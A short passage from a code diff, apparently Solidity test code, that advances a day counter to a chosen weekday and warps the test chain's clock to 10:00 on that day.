+        ++day;
+        while ((day + 4) % 7 != 1) ++day;
+        vm.warp(day * 1 days + 10 hours);
+    }
+}
```
